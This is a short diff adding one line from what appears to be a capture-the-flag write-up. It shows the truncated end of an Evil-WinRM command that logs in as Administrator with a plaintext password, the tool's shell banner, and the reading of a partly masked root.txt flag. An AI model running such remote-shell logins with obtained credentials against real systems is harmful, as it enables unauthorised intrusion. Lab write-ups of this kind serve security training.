@@ -1,0 +1,1 @@
+nistrator -s . -e . -p '4dD!5}x/re8]FBuZ' Info: Starting Evil-WinRM shell v1.6 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents> And get root.txt : *Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt 50dfa3c6************************
